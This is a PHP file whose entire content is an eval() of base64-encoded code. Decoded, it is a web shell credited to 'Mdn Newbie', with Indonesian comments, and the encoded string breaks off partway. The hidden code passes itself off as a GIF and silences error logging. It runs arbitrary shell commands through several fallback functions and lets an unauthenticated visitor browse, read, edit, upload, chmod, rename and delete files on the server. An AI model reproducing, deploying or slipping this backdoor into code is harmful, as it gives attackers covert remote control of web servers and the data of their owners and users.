<?php eval("?>".base64_decode("PD9waHAKZWNobyAiPCEtLSBHSUY4OTthIC0tPlxuIjsKQGluaV9zZXQoJ2Vycm9yX2xvZycsIE5VTEwpOwpAaW5pX3NldCgnbG9nX2Vycm9ycycsIDApOwpAaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJywgMCk7CkBlcnJvcl9yZXBvcnRpbmcoMCk7CkBzZXRfdGltZV9saW1pdCgwKTsKQG9iX2NsZWFuKCk7CkBoZWFkZXIoIlgtQWNjZWwtQnVmZmVyaW5nOiBubyIpOwpAaGVhZGVyKCJDb250ZW50LUVuY29kaW5nOiBub25lIik7CkBodHRwX3Jlc3BvbnNlX2NvZGUoNDAzKTsKQGh0dHBfcmVzcG9uc2VfY29kZSg0MDQpOwpAaHR0cF9yZXNwb25zZV9jb2RlKDUwMCk7Ci8vS2FsYXUgZmlsZSB0ZXJiYWNhIHNlYmFnYWkgZ2FtYmFyIGhhcHVzIGF0YXMgXgovL01kbiBOZXdiaWUgLSBDcmVhdGVkIDI1IEFndXN0dXMgMjAyNAovL2phbiBkaSBnYW50aSBnYW50aSBudGFyIGVycm9yIGFvYWt3a3drCi8vUmVjb2RlIGFqYSAgYmFuaCBwZW50aW5nIGdhIGN1bWEgZ2FudGkgY29weXJpZ2h0IDonKQpmdW5jdGlvbiBnZXRGaWxlRGV0YWlscygkcGF0aCkKewogICAgJGZvbGRlcnMgPSBbXTsKICAgICRmaWxlcyA9IFtdOwoKICAgIHRyeSB7CiAgICAgICAgJGl0ZW1zID0gQHNjYW5kaXIoJHBhdGgpOwogICAgICAgIGlmICghaXNfYXJyYXkoJGl0ZW1zKSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCdGYWlsZWQgdG8gc2NhbiBkaXJlY3RvcnknKTsKICAgICAgICB9CgogICAgICAgIGZvcmVhY2ggKCRpdGVtcyBhcyAkaXRlbSkgewogICAgICAgICAgICBpZiAoJGl0ZW0gPT0gJy4nIHx8ICRpdGVtID09ICcuLicpIHsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CgogICAgICAgICAgICAkaXRlbVBhdGggPSAkcGF0aCAuICcvJyAuICRpdGVtOwogICAgICAgICAgICAkaXRlbURldGFpbHMgPSBbCiAgICAgICAgICAgICAgICAnbmFtZScgPT4gJGl0ZW0sCiAgICAgICAgICAgICAgICAndHlwZScgPT4gaXNfZGlyKCRpdGVtUGF0aCkgPyAnRm9sZGVyJyA6ICdGaWxlJywKICAgICAgICAgICAgICAgICdzaXplJyA9PiBpc19kaXIoJGl0ZW1QYXRoKSA/ICcnIDogZm9ybWF0U2l6ZShmaWxlc2l6ZSgkaXRlbVBhdGgpKSwKICAgICAgICAgICAgICAgICdwZXJtaXNzaW9uJyA9PiBzdWJzdHIoc3ByaW50ZignJW8nLCBmaWxlcGVybXMoJGl0ZW1QYXRoKSksIC00KSwKICAgICAgICAgICAgXTsKICAgICAgICAgICAgaWYgKGlzX2RpcigkaXRlbVBhdGgpKSB7CiAgICAgICAgICAgICAgICAkZm9sZGVyc1tdID0gJGl0ZW1EZXRhaWxzOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJGZpbGVzW10gPSAkaXRlbURldGFpbHM7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHJldHVybiBhcnJheV9tZXJnZSgkZm9sZGVycywgJGZpbGVzKTsKICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgewogICAgICAgIHJldHVybiAnTm9uZSc7CiAgICB9Cn0KCmZ1bmN0aW9uIGZvcm1hdFNpemUoJHNpemUpCnsKICAgICR1bml0cyA9IGFycmF5KCdCJywgJ0tCJywgJ01CJywgJ0dCJywgJ1RCJyk7CiAgICAkaSA9IDA7CiAgICB3aGlsZSAoJHNpemUgPj0gMTAyNCAmJiAkaSA8IDQpIHsKICAgICAgICAkc2l6ZSAvPSAxMDI0OwogICAgICAgICRpKys7CiAgICB9CiAgICByZXR1cm4gcm91bmQoJHNpemUsIDIpIC4gJyAnIC4gJHVuaXRzWyRpXTsKfQovL2NtZCBmaXR1cgpmdW5jdGlvbiBleGVjdXRlQ29tbWFuZCgkY29tbWFuZCkKewogICAgJGN1cnJlbnREaXJlY3RvcnkgPSBnZXRDdXJyZW50RGlyZWN0b3J5KCk7CiAgICAkY29tbWFuZCA9ICJjZCAkY3VycmVudERpcmVjdG9yeSAmJiAkY29tbWFuZCI7CgogICAgJG91dHB1dCA9ICcnOwogICAgJGVycm9yID0gJyc7CgogICAgLy8gcHJvY19vcGVuCiAgICAkZGVzY3JpcHRvcnMgPSBbCiAgICAgICAgMCA9PiBbJ3BpcGUnLCAnciddLAogICAgICAgIDEgPT4gWydwaXBlJywgJ3cnXSwKICAgICAgICAyID0+IFsncGlwZScsICd3J10sCiAgICBdOwoKICAgICRwcm9jZXNzID0gQHByb2Nfb3BlbigkY29tbWFuZCwgJGRlc2NyaXB0b3JzLCAkcGlwZXMpOwoKICAgIGlmIChpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsKICAgICAgICBmY2xvc2UoJHBpcGVzWzBdKTsKCiAgICAgICAgJG91dHB1dCA9IHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzFdKTsKICAgICAgICBmY2xvc2UoJHBpcGVzWzFdKTsKCiAgICAgICAgJGVycm9yID0gc3RyZWFtX2dldF9jb250ZW50cygkcGlwZXNbMl0pOwogICAgICAgIGZjbG9zZSgkcGlwZXNbMl0pOwoKICAgICAgICAkcmV0dXJuVmFsdWUgPSBwcm9jX2Nsb3NlKCRwcm9jZXNzKTsKCiAgICAgICAgJG91dHB1dCA9IHRyaW0oJG91dHB1dCk7CiAgICAgICAgJGVycm9yID0gdHJpbSgkZXJyb3IpOwoKICAgICAgICBpZiAoJHJldHVyblZhbHVlID09PSAwICYmICFlbXB0eSgkb3V0cHV0KSkgewogICAgICAgICAgICByZXR1cm4gJG91dHB1dDsKICAgICAgICB9IGVsc2VpZiAoIWVtcHR5KCRlcnJvcikpIHsKICAgICAgICAgICAgcmV0dXJuICdFcnJvcjogJyAuICRlcnJvcjsKICAgICAgICB9CiAgICB9CgogICAgLy8gc2hlbGxfZXhlYwogICAgJHNoZWxsT3V0cHV0ID0gQHNoZWxsX2V4ZWMoJGNvbW1hbmQpOwogICAgaWYgKCRzaGVsbE91dHB1dCAhPT0gbnVsbCkgewogICAgICAgICRvdXRwdXQgPSB0cmltKCRzaGVsbE91dHB1dCk7CiAgICAgICAgaWYgKCFlbXB0eSgkb3V0cHV0KSkgewogICAgICAgICAgICByZXR1cm4gJG91dHB1dDsKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgICRlcnJvciA9IGVycm9yX2dldF9sYXN0KCk7CiAgICAgICAgaWYgKCFlbXB0eSgkZXJyb3IpKSB7CiAgICAgICAgICAgIHJldHVybiAnRXJyb3I6ICcgLiAkZXJyb3JbJ21lc3NhZ2UnXTsKICAgICAgICB9CiAgICB9CgogICAgLy8gZXhlYwogICAgQGV4ZWMoJGNvbW1hbmQsICRleGVjT3V0cHV0LCAkZXhlY1N0YXR1cyk7CiAgICBpZiAoJGV4ZWNTdGF0dXMgPT09IDApIHsKICAgICAgICAkb3V0cHV0ID0gaW1wbG9kZShQSFBfRU9MLCAkZXhlY091dHB1dCk7CiAgICAgICAgaWYgKCFlbXB0eSgkb3V0cHV0KSkgewogICAgICAgICAgICByZXR1cm4gJG91dHB1dDsKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgIHJldHVybiAnRXJyb3I6IENvbW1hbmQgZXhlY3V0aW9uIGZhaWxlZC4nOwogICAgfQoKICAgIC8vIHBhc3N0aHJ1CiAgICBvYl9zdGFydCgpOwogICAgQHBhc3N0aHJ1KCRjb21tYW5kLCAkcGFzc3RocnVTdGF0dXMpOwogICAgJHBhc3N0aHJ1T3V0cHV0ID0gb2JfZ2V0X2NsZWFuKCk7CiAgICBpZiAoJHBhc3N0aHJ1U3RhdHVzID09PSAwKSB7CiAgICAgICAgJG91dHB1dCA9ICRwYXNzdGhydU91dHB1dDsKICAgICAgICBpZiAoIWVtcHR5KCRvdXRwdXQpKSB7CiAgICAgICAgICAgIHJldHVybiAkb3V0cHV0OwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgcmV0dXJuICdFcnJvcjogQ29tbWFuZCBleGVjdXRpb24gZmFpbGVkLic7CiAgICB9CgogICAgLy8gc3lzdGVtCiAgICBvYl9zdGFydCgpOwogICAgQHN5c3RlbSgkY29tbWFuZCwgJHN5c3RlbVN0YXR1cyk7CiAgICAkc3lzdGVtT3V0cHV0ID0gb2JfZ2V0X2NsZWFuKCk7CiAgICBpZiAoJHN5c3RlbVN0YXR1cyA9PT0gMCkgewogICAgICAgICRvdXRwdXQgPSAkc3lzdGVtT3V0cHV0OwogICAgICAgIGlmICghZW1wdHkoJG91dHB1dCkpIHsKICAgICAgICAgICAgcmV0dXJuICRvdXRwdXQ7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gJ0Vycm9yOiBDb21tYW5kIGV4ZWN1dGlvbiBmYWlsZWQuJzsKICAgIH0KCiAgICByZXR1cm4gJ0Vycm9yOiBDb21tYW5kIGV4ZWN1dGlvbiBmYWlsZWQuJzsKfQpmdW5jdGlvbiByZWFkRmlsZUNvbnRlbnQoJGZpbGUpCnsKICAgIHJldHVybiBmaWxlX2dldF9jb250ZW50cygkZmlsZSk7Cn0KCmZ1bmN0aW9uIHNhdmVGaWxlQ29udGVudCgkZmlsZSkKewogICAgaWYgKGlzc2V0KCRfUE9TVFsnY29udGVudCddKSkgewogICAgICAgIHJldHVybiBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJF9QT1NUWydjb250ZW50J10pICE9PSBmYWxzZTsKICAgIH0KICAgIHJldHVybiBmYWxzZTsKfQovL3VwZmlsZQpmdW5jdGlvbiB1cGxvYWRGaWxlKCR0YXJnZXREaXJlY3RvcnkpCnsKICAgIGlmIChpc3NldCgkX0ZJTEVTWydmaWxlJ10pKSB7CiAgICAgICAgJGN1cnJlbnREaXJlY3RvcnkgPSBnZXRDdXJyZW50RGlyZWN0b3J5KCk7CiAgICAgICAgJHRhcmdldEZpbGUgPSAkdGFyZ2V0RGlyZWN0b3J5IC4gJy8nIC4gYmFzZW5hbWUoJF9GSUxFU1snZmlsZSddWyduYW1lJ10pOwogICAgICAgIGlmICgkX0ZJTEVTWydmaWxlJ11bJ3NpemUnXSA9PT0gMCkgewogICAgICAgICAgICByZXR1cm4gJ09wZW4gVXIgRXllcyBCaXRjaCAhISEuJzsKICAgICAgICB9IGVsc2UgewogICAgICAgIGlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkdGFyZ2V0RmlsZSkpIHsKICAgICAgICAgICAgcmV0dXJuICdGaWxlIHVwbG9hZGVkIHN1Y2Nlc3NmdWxseS4nOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiAnRXJyb3IgdXBsb2FkaW5nIGZpbGUuJzsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJyc7Cn0KfQovL2RpcgpmdW5jdGlvbiBjaGFuZ2VEaXJlY3RvcnkoJHBhdGgpCnsKICAgIGlmICgkcGF0aCA9PT0gJy4uJykgewogICAgICAgIEBjaGRpcignLi4nKTsKICAgIH0gZWxzZSB7CiAgICAgICAgQGNoZGlyKCRwYXRoKTsKICAgIH0KfQoKZnVuY3Rpb24gZ2V0Q3VycmVudERpcmVjdG9yeSgpCnsKICAgIHJldHVybiByZWFscGF0aChnZXRjd2QoKSk7Cn0KCi8vb3BlbiBmaWxlIGp1Z2EgZm9sZGVyCmZ1bmN0aW9uIGdldExpbmsoJHBhdGgsICRuYW1lKQp7CiAgICBpZiAoaXNfZGlyKCRwYXRoKSkgewogICAgICAgIHJldHVybiAnPGEgaHJlZj0iP2Rpcj0nIC4gdXJsZW5jb2RlKCRwYXRoKSAuICciPicgLiAkbmFtZSAuICc8L2E+JzsKICAgIH0gZWxzZWlmIChpc19maWxlKCRwYXRoKSkgewogICAgICAgIHJldHVybiAnPGEgaHJlZj0iP2Rpcj0nIC4gdXJsZW5jb2RlKGRpcm5hbWUoJHBhdGgpKSAuICcmYW1wO3JlYWQ9JyAuIHVybGVuY29kZSgkcGF0aCkgLiAnIj4nIC4gJG5hbWUgLiAnPC9hPic7CgogICAgfQp9CmZ1bmN0aW9uIGdldERpcmVjdG9yeUFycmF5KCRwYXRoKQp7CiAgICAkZGlyZWN0b3JpZXMgPSBleHBsb2RlKCcvJywgJHBhdGgpOwogICAgJGRpcmVjdG9yeUFycmF5ID0gW107CiAgICAkY3VycmVudFBhdGggPSAnJzsKICAgIGZvcmVhY2ggKCRkaXJlY3RvcmllcyBhcyAkZGlyZWN0b3J5KSB7CiAgICAgICAgaWYgKCFlbXB0eSgkZGlyZWN0b3J5KSkgewogICAgICAgICAgICAkY3VycmVudFBhdGggLj0gJy8nIC4gJGRpcmVjdG9yeTsKICAgICAgICAgICAgJGRpcmVjdG9yeUFycmF5W10gPSBbCiAgICAgICAgICAgICAgICAncGF0aCcgPT4gJGN1cnJlbnRQYXRoLAogICAgICAgICAgICAgICAgJ25hbWUnID0+ICRkaXJlY3RvcnksCiAgICAgICAgICAgIF07CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICRkaXJlY3RvcnlBcnJheTsKfQoKCmZ1bmN0aW9uIHNob3dCcmVhZGNydW1iKCRwYXRoKQp7CiAgICAkcGF0aCA9IHN0cl9yZXBsYWNlKCdcXCcsICcvJywgJHBhdGgpOwogICAgJHBhdGhzID0gZXhwbG9kZSgnLycsICRwYXRoKTsKICAgID8+CiAgICA8ZGl2IGNsYXNzPSJicmVhZGNydW1iIj4KICAgICAgICA8P3BocCBmb3JlYWNoICgkcGF0aHMgYXMgJGlkID0+ICRwYXQpIHsgPz4KICAgICAgICAgICAgPD9waHAgaWYgKCRwYXQgPT0gJycgJiYgJGlkID09IDApIHsgPz4KICAgICAgICAgICAgIERJUiA6IDxhIGhyZWY9Ij9kaXI9LyI+LzwvYT4KICAgICAgICAgICAgPD9waHAgfSA/PgogICAgICAgICAgICA8P3BocCBpZiAoJHBhdCA9PSAnJykgewogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0gPz4KICAgICAgICAgICAgPD9waHAgJGxpbmtQYXRoID0gaW1wbG9kZSgnLycsIGFycmF5X3NsaWNlKCRwYXRocywgMCwgJGlkICsgMSkpOyA/PgogICAgICAgICAgICA8YSBocmVmPSI/ZGlyPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRsaW5rUGF0aCk7ID8+Ij48P3BocCBlY2hvICRwYXQ7ID8+PC9hPi8KICAgICAgICA8P3BocCB9ID8+CiAgICA8L2Rpdj4KICAgIDw/cGhwCn0KCgovL3RhYmVsIGJpYXIga2VyZW4KZnVuY3Rpb24gc2hvd0ZpbGVUYWJsZSgkcGF0aCkKewogICAgJGZpbGVEZXRhaWxzID0gZ2V0RmlsZURldGFpbHMoJHBhdGgpOwogICAgPz4KICAgIDx0YWJsZT4KICAgICAgICA8dHI+CiAgICAgICAgICAgIDx0aD5OYW1lPC90aD4KICAgICAgICAgICAgPHRoPlR5cGU8L3RoPgogICAgICAgICAgICA8dGg+U2l6ZTwvdGg+CiAgICAgICAgICAgIDx0aD5QZXJtaXNzaW9uPC90aD4KICAgICAgICAgICAgPHRoPkFjdGlvbnM8L3RoPgogICAgICAgIDwvdHI+CiAgICAgICAgPD9waHAgaWYgKGlzX2FycmF5KCRmaWxlRGV0YWlscykpIHsgPz4KICAgICAgICAgICAgPD9waHAgZm9yZWFjaCAoJGZpbGVEZXRhaWxzIGFzICRmaWxlRGV0YWlsKSB7ID8+CiAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgPHRkPjw/cGhwIGVjaG8gZ2V0TGluaygkcGF0aCAuICcvJyAuICRmaWxlRGV0YWlsWyduYW1lJ10sICRmaWxlRGV0YWlsWyduYW1lJ10pOyA/PjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgPHRkPjw/cGhwIGVjaG8gJGZpbGVEZXRhaWxbJ3R5cGUnXTsgPz48L3RkPgogICAgICAgICAgICAgICAgICAgIDx0ZD48P3BocCBlY2hvICRmaWxlRGV0YWlsWydzaXplJ107ID8+PC90ZD4KICAgICAgICAgICAgICAgICAgICA8dGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICAgICAgICAgICAgICAgICRwZXJtaXNzaW9uQ29sb3IgPSBpc193cml0YWJsZSgkcGF0aCAuICcvJyAuICRmaWxlRGV0YWlsWyduYW1lJ10pID8gJ2dyZWVuJyA6ICdyZWQnOwogICAgICAgICAgICAgICAgICAgICAgICA/PgogICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBzdHlsZT0iY29sb3I6IDw/cGhwIGVjaG8gJHBlcm1pc3Npb25Db2xvcjsgPz4iPjw/cGhwIGVjaG8gJGZpbGVEZXRhaWxbJ3Blcm1pc3Npb24nXTsgPz48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPHRkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICgkZmlsZURldGFpbFsndHlwZSddID09PSAnRmlsZScpIHsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRyb3Bkb3duIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkcm9wYnRuIj5BY3Rpb25zPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZHJvcGRvd24tY29udGVudCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ij9kaXI9PD9waHAgZWNobyB1cmxlbmNvZGUoJHBhdGgpOyA/PiZlZGl0PTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRwYXRoIC4gJy8nIC4gJGZpbGVEZXRhaWxbJ25hbWUnXSk7ID8+Ij5FZGl0PC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSI/ZGlyPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRwYXRoKTsgPz4mcmVuYW1lPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlRGV0YWlsWyduYW1lJ10pOyA/PiI+UmVuYW1lPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSI/ZGlyPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRwYXRoKTsgPz4mY2htb2Q9PD9waHAgZWNobyB1cmxlbmNvZGUoJGZpbGVEZXRhaWxbJ25hbWUnXSk7ID8+Ij5DaG1vZDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iP2Rpcj08P3BocCBlY2hvIHVybGVuY29kZSgkcGF0aCk7ID8+JmRlbGV0ZT08P3BocCBlY2hvIHVybGVuY29kZSgkZmlsZURldGFpbFsnbmFtZSddKTsgPz4iPkRlbGV0ZTwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgfSA/PgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBpZiAoJGZpbGVEZXRhaWxbJ3R5cGUnXSA9PT0gJ0ZvbGRlcicpIHsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRyb3Bkb3duIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkcm9wYnRuIj5BY3Rpb25zPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZHJvcGRvd24tY29udGVudCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ij9kaXI9PD9waHAgZWNobyB1cmxlbmNvZGUoJHBhdGgpOyA/PiZyZW5hbWU9PD9waHAgZWNobyB1cmxlbmNvZGUoJGZpbGVEZXRhaWxbJ25hbWUnXSk7ID8+Ij5SZW5hbWU8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ij9kaXI9PD9waHAgZWNobyB1cmxlbmNvZGUoJHBhdGgpOyA/PiZjaG1vZD08P3BocCBlY2hvIHVybGVuY29kZSgkZmlsZURldGFpbFsnbmFtZSddKTsgPz4iPkNobW9kPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSI/ZGlyPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRwYXRoKTsgPz4mZGVsZXRlPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlRGV0YWlsWyduYW1lJ10pOyA/PiI+RGVsZXRlPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCB9ID8+CiAgICAgICAgICAgICAgICAgICAgPC90ZD4KICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgIDw/cGhwIH0gPz4KICAgICAgICA8P3BocCB9IGVsc2UgeyA/PgogICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iNSI+Tm9uZTwvdGQ+CiAgICAgICAgICAgIDwvdHI+CiAgICAgICAgPD9waHAgfSA/PgogICAgPC90YWJsZT4KICAgIDw/cGhwCn0KLy9jaG1vZApmdW5jdGlvbiBjaGFuZ2VQZXJtaXNzaW9uKCRwYXRoKQp7CiAgICBpZiAoIWZpbGVfZXhpc3RzKCRwYXRoKSkgewogICAgICAgIHJldHVybiAnRmlsZSBvciBkaXJlY3RvcnkgZG9lcyBub3QgZXhpc3QuJzsKICAgIH0KCiAgICAkcGVybWlzc2lvbiA9IGlzc2V0KCRfUE9TVFsncGVybWlzc2lvbiddKSA/ICRfUE9TVFsncGVybWlzc2lvbiddIDogJyc7CiAgICAKICAgIGlmICgkcGVybWlzc2lvbiA9PT0gJycpIHsKICAgICAgICByZXR1cm4gJ0ludmFsaWQgcGVybWlzc2lvbiB2YWx1ZS4nOwogICAgfQoKICAgIGlmICghaXNfZGlyKCRwYXRoKSAmJiAhaXNfZmlsZSgkcGF0aCkpIHsKICAgICAgICByZXR1cm4gJ0Nhbm5vdCBjaGFuZ2UgcGVybWlzc2lvbi4gT25seSBkaXJlY3RvcmllcyBhbmQgZmlsZXMgY2FuIGhhdmUgcGVybWlzc2lvbnMgbW9kaWZpZWQuJzsKICAgIH0KCiAgICAkcGFyc2VkUGVybWlzc2lvbiA9IGludHZhbCgkcGVybWlzc2lvbiwgOCk7CiAgICBpZiAoJHBhcnNlZFBlcm1pc3Npb24gPT09IDApIHsKICAgICAgICByZXR1cm4gJ0ludmFsaWQgcGVybWlzc2lvbiB2YWx1ZS4nOwogICAgfQoKICAgIGlmIChjaG1vZFJlY3Vyc2l2ZSgkcGF0aCwgJHBhcnNlZFBlcm1pc3Npb24pKSB7CiAgICAgICAgcmV0dXJuICdQZXJtaXNzaW9uIGNoYW5nZWQgc3VjY2Vzc2Z1bGx5Lic7CiAgICB9IGVsc2UgewogICAgICAgIHJldHVybiAnRXJyb3IgY2hhbmdpbmcgcGVybWlzc2lvbi4nOwogICAgfQp9CgoKZnVuY3Rpb24gY2htb2RSZWN1cnNpdmUoJHBhdGgsICRwZXJtaXNzaW9uKQp7CiAgICBpZiAoaXNfZGlyKCRwYXRoKSkgewogICAgICAgICRpdGVtcyA9IHNjYW5kaXIoJHBhdGgpOwogICAgICAgIGlmICgkaXRlbXMgPT09IGZhbHNlKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CgogICAgICAgIGZvcmVhY2ggKCRpdGVtcyBhcyAkaXRlbSkgewogICAgICAgICAgICBpZiAoJGl0ZW0gPT0gJy4nIHx8ICRpdGVtID09ICcuLicpIHsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CgogICAgICAgICAgICAkaXRlbVBhdGggPSAkcGF0aCAuICcvJyAuICRpdGVtOwoKICAgICAgICAgICAgaWYgKGlzX2RpcigkaXRlbVBhdGgpKSB7CiAgICAgICAgICAgICAgICBpZiAoIWNobW9kKCRpdGVtUGF0aCwgJHBlcm1pc3Npb24pKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICghY2htb2RSZWN1cnNpdmUoJGl0ZW1QYXRoLCAkcGVybWlzc2lvbikpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoIWNobW9kKCRpdGVtUGF0aCwgJHBlcm1pc3Npb24pKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBpZiAoIWNobW9kKCRwYXRoLCAkcGVybWlzc2lvbikpIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgIH0KCiAgICByZXR1cm4gdHJ1ZTsKfQoKLy9yZW5hbWUKZnVuY3Rpb24gcmVuYW1lRmlsZSgkb2xkTmFtZSwgJG5ld05hbWUpCnsKICAgIGlmIChmaWxlX2V4aXN0cygkb2xkTmFtZSkpIHsKICAgICAgICAkZGlyZWN0b3J5ID0gZGlybmFtZSgkb2xkTmFtZSk7CiAgICAgICAgJG5ld1BhdGggPSAkZGlyZWN0b3J5IC4gJy8nIC4gJG5ld05hbWU7CiAgICAgICAgaWYgKHJlbmFtZSgkb2xkTmFtZSwgJG5ld1BhdGgpKSB7CiAgICAgICAgICAgIHJldHVybiAnRmlsZSBvciBmb2xkZXIgcmVuYW1lZCBzdWNjZXNzZnVsbHkuJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gJ0Vycm9yIHJlbmFtaW5nIGZpbGUgb3IgZm9sZGVyLic7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gJ0ZpbGUgb3IgZm9sZGVyIGRvZXMgbm90IGV4aXN0Lic7CiAgICB9Cn0KCi8vZGVsZXRlCmZ1bmN0aW9uIGRlbGV0ZUZpbGUoJGZpbGUpCnsKICAgIGlmIChmaWxlX2V4aXN0cygkZmlsZSkpIHsKICAgICAgICBpZiAodW5saW5rKCRmaWxlKSkgewogICAgICAgICAgICByZXR1cm4gJ0ZpbGUgZGVsZXRlZCBzdWNjZXNzZnVsbHkuJyAuICRmaWxlOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiAnRXJyb3IgZGVsZXRpbmcgZmlsZS4nOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgcmV0dXJuICdGaWxlIGRvZXMgbm90IGV4aXN0Lic7CiAgICB9Cn0KCmZ1bmN0aW9uIGRlbGV0ZUZvbGRlcigkZm9sZGVyKQp7CiAgICBpZiAoaXNfZGlyKCRmb2xkZXIpKSB7CiAgICAgICAgJGZpbGVzID0gZ2xvYigkZm9sZGVyIC4gJy8qJyk7CiAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7CiAgICAgICAgICAgIGlzX2RpcigkZmlsZSkgPyBkZWxldGVGb2xkZXIoJGZpbGUpIDogdW5saW5rKCRmaWxlKTsKICAgICAgICB9CiAgICAgICAgaWYgKHJtZGlyKCRmb2xkZXIpKSB7CiAgICAgICAgICAgIHJldHVybiAnRm9sZGVyIGRlbGV0ZWQgc3VjY2Vzc2Z1bGx5LicgLiAkZm9sZGVyOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiAnRXJyb3IgZGVsZXRpbmcgZm9sZGVyLic7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gJ0ZvbGRlciBkb2VzIG5vdCBleGlzdC4nOwogICAgfQp9Ci8vbWFpbiBsb2dpYyBkaXJlY3RvcnkgCiRjdXJyZW50RGlyZWN0b3J5ID0gZ2V0Q3VycmVudERpcmVjdG9yeSgpOwokZXJyb3JNZXNzYWdlID0gJyc7CiRyZXNwb25zZU1lc3NhZ2UgPSAnJzsKCmlmIChpc3NldCgkX0dFVFsnZGlyJ10pKSB7CiAgICBjaGFuZ2VEaXJlY3RvcnkoJF9HRVRbJ2RpciddKTsKICAgICRjdXJyZW50RGlyZWN0b3J5ID0gZ2V0Q3VycmVudERpcmVjdG9yeSgpOwp9Ci8vZWRpdAppZiAoaXNzZXQoJF9HRVRbJ2VkaXQnXSkpIHsKICAgICRmaWxlID0gJF9HRVRbJ2VkaXQnXTsKICAgICRjb250ZW50ID0gcmVhZEZpbGVDb250ZW50KCRmaWxlKTsKICAgIGlmICgkX1NF